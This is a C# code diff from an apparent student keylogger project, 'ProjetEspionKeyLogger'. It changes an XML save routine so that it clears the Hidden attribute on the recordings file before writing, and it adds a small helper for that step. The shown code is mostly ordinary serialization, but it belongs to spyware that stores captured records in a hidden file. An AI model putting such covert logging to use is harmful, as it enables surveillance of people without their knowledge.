@@ -68,17 +68,28 @@ namespace ProjetEspionKeyLogger
         //sauvegarde dans un fichier XML
         public void saveToXml(string nomFichier)
         {
+            //on enleve le statut caché pour pouvoir ecrire dans le fichier
+            //source : https://www.geeksforgeeks.org/file-setattributes-method-in-csharp-with-examples/
+            FileAttributes attributs = File.GetAttributes("C:/Users/Laura/source/repos/ProjetCsharp/ProjetEspionKeyLogger/bin/Debug/netcoreapp3.1/TestXML.xml");
+            attributs = RemoveAttribute(attributs, FileAttributes.Hidden);
+            File.SetAttributes("C:/Users/Laura/source/repos/ProjetCsharp/ProjetEspionKeyLogger/bin/Debug/netcoreapp3.1/TestXML.xml", attributs);
             //Fichier XML
-             FileStream file = File.Open(nomFichier, FileMode.Create);
+            FileStream file = File.Open(nomFichier, FileMode.Create);
 
             //Ecriture de la collection
             XmlSerializer serializer = new XmlSerializer(typeof(CollectionEnregistrement));
             serializer.Serialize(file, this);
 
+                      
             //fermeture du fichier
             file.Close();
         }
 
+        //sert pour enlever le statut cacher
+        private FileAttributes RemoveAttribute(FileAttributes attributs, FileAttributes hidden)
+        {
+            return attributs & ~hidden;
+        }
 
         public static CollectionEnregistrement loadFromXML(string nomFichier)
         {
@@ -89,6 +100,7 @@ namespace ProjetEspionKeyLogger
             return collection_enregistrement;
         }
 
+        
         public void afficher()
         {
             foreach (Enregistrement enregistrement in list_enregistrement)
